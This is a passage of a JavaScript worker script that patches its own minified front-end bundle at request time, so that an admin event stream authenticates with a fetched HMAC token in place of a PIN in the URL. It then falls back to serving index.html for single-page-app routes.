      const OLD_SSE = `try{const St=await He(\`/api/master/events?pin=\${encodeURIComponent(r)}\`,{method:"HEAD"}).catch(()=>null);if(St&&St.status===401){ge=!0,d();return}}catch{}ge||(W=new EventSource(\`/api/master/events?pin=\${encodeURIComponent(r)}\`)`;
      // NEW: fetch HMAC token first, then EventSource with ?token=
      const NEW_SSE = `try{const _tr=await He("/api/master/sse-token",{method:"POST",headers:{"Content-Type":"application/json","x-master-pin":r},body:JSON.stringify({pin:r})});if(!_tr.ok){if(!ge)setTimeout(ze,5e3);return}const{token:_tk}=await _tr.json();if(ge)return;!ge&&(W=new EventSource(\`/api/master/events?token=\${encodeURIComponent(_tk)}\`)`;
      const patched = js.includes(OLD_SSE) ? js.replace(OLD_SSE, NEW_SSE) : js;
      return new Response(patched, {
        headers: {
          "Content-Type": "application/javascript; charset=utf-8",
          "Cache-Control": "no-store",
        },
      });
    }
    // fall through to Pages static assets (React SPA)
    // Universal SPA fallback: any non-API, non-asset 404 → serve index.html
    const assetResp = await env.ASSETS.fetch(request);
    if (assetResp.status === 404) {
      const isAsset = /\.(?:js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|json|txt|xml)$/i.test(url.pathname);
      if (!isAsset) {
        const indexReq = new Request(
          new URL("/index.html", request.url).toString(),
          { headers: request.headers, method: "GET" }
        );
        return env.ASSETS.fetch(indexReq);
      }
    }
    return assetResp;
  },
};
